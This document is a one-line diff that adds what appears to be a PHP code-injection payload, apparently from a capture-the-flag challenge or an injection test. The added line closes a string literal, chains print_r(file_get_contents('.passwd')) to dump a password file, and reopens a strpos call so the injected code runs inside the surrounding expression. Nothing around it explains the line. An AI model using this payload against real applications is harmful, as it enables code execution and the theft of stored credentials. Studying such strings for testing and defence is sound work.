@@ -1,0 +1,1 @@
+','exp') || print_r(file_get_contents(".passwd")) || strpos('
